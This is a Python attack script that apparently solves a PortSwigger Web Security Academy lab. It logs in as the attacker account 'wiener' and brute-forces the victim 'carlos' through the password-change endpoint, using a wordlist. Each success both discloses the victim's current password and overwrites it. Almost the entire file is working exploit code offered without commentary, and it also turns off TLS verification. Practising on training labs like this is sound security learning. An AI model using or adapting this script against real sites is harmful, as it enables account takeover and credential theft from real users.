import requests
import sys

from urllib3.exceptions import InsecureRequestWarning

proxies = {
    "https": "http://127.0.0.1:8080"
}

session = requests.session()
session.proxies.update(proxies)
session.verify = False


def reset_password(password_reset_url, username, current_password, new_password, cookie):

    data = {
        "username": username,
        "current-password": current_password,
        "new-password-1": new_password,
        "new-password-2": new_password
    }

    headers = {
        'Cookie': f"session={cookie}"
    }

    response = session.post(password_reset_url, data=data, headers=headers, allow_redirects=False)
    content = response.content.decode()
    
    return "Password changed successfully!" in content


def login(login_url, username, password) -> str:

    data = {
        "username": username,
        "password": password
    }

    response = session.post(login_url, data=data, allow_redirects=False)

    return response.cookies.get_dict()['session']

def main():

    # Suppress only the single warning from urllib3 needed.
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    password_file = "passwords.txt"
    passwords = [x.strip() for x in open(password_file).readlines()]

    login_url = "https://ac5e1f901f52f479c0ff6adb00390000.web-security-academy.net/login"
    password_reset_url = "https://ac5e1f901f52f479c0ff6adb00390000.web-security-academy.net/my-account/change-password"
    attacker_username = "wiener"
    attacker_password = "peter"
    victim_user = "carlos"
    victim_new_password = "peter"

    for password in passwords:

        victim_current_password = password

        cookie = login(login_url, attacker_username, attacker_password)

        if reset_password(password_reset_url, victim_user, victim_current_password, victim_new_password, cookie):
            print(f"[+] Found password: {victim_current_password}")
            sys.exit(0)
    

if __name__ == '__main__':

    main()
